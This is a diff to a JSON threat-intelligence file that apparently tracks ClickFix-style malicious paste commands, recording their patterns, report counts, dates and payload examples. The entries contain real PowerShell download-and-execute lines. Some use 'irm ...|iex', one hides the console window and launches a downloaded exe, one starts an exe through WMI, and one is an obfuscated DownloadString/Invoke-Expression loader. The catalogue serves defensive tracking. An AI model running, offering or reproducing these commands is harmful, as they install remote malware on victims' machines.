@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 168,
-    "ReportCount": 168,
+    "DistinctPayloadCount": 169,
+    "ReportCount": 169,
     "FirstSeen": "2026-11-12T05:39:56.995000+00:00",
-    "LastSeen": "2026-11-18T10:54:56.701000+00:00",
+    "LastSeen": "2026-11-18T17:34:21.022000+00:00",
     "ReportIds": [
       "cmwd4cakt005k0omlhwj5h50t",
       "cmwd5z88d01o80oml0h5gnsao",
@@ -173,7 +173,8 @@
       "cmwlp7eru1pez0oml6hrurmma",
       "cmwlpksd71q9i0omleq8xjfc9",
       "cmwlzwqas1r3f0omlavhnj44e",
-      "cmwm08hou1raj0omlprcdx0ey"
+      "cmwm08hou1raj0omlprcdx0ey",
+      "cmwmei4nv1tbg0omlbgmnensw"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -239,6 +240,7 @@
       "irm 'browse-cloud.codes/65ba5e5cabdf023c'|iex;",
       "irm 'browse-cloud.codes/66e3f1b391f2996a'|iex;",
       "irm 'browse-cloud.codes/688f43a4c4e6a9ce'|iex;",
+      "irm 'browse-cloud.codes/6a1e6596d11a876e'|iex;",
       "irm 'browse-cloud.codes/6a72ba2774c19eaf'|iex;",
       "irm 'browse-cloud.codes/6b35b335949d46f1'|iex;",
       "irm 'browse-cloud.codes/6b52bdf4796d4c60'|iex;",
@@ -822,11 +824,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 47,
-    "FirstSeen": "2026-11-11T17:57:00.720000+00:00",
+    "ReportCount": 46,
+    "FirstSeen": "2026-11-11T23:05:45.104000+00:00",
     "LastSeen": "2026-11-18T16:48:42.514000+00:00",
     "ReportIds": [
-      "cmwcf8b7j07s00omljo01l4y5",
       "cmwcq9cnn0c1l0omlfc0yrkd9",
       "cmwcrpt0v0d8q0omleewsbsdg",
       "cmwdhnhcn049m0omljepq03hd",
@@ -1005,20 +1006,6 @@
     ]
   },
   {
-    "Pattern": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"<URL>\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 2,
-    "FirstSeen": "2026-11-11T17:56:04.253000+00:00",
-    "LastSeen": "2026-11-12T11:51:47.800000+00:00",
-    "ReportIds": [
-      "cmwcf73lu07rj0omlahvm476x",
-      "cmwdhmhp504920omlkj1isj57"
-    ],
-    "PayloadExamples": [
-      "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit"
-    ]
-  },
-  {
     "Pattern": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
     "DistinctPayloadCount": 1,
     "ReportCount": 2,
@@ -1085,6 +1072,19 @@
     ],
     "PayloadExamples": [
       "$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...a) { window.clipboardData.setData('Text', command); } }); <!-- clickfix-observer-corpus --> powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/'...\n...w-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression"
+    ]
+  },
+  {
+    "Pattern": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"<URL>\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-12T11:51:47.800000+00:00",
+    "LastSeen": "2026-11-12T11:51:47.800000+00:00",
+    "ReportIds": [
+      "cmwdhmhp504920omlkj1isj57"
+    ],
+    "PayloadExamples": [
+      "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit"
     ]
   },
   {
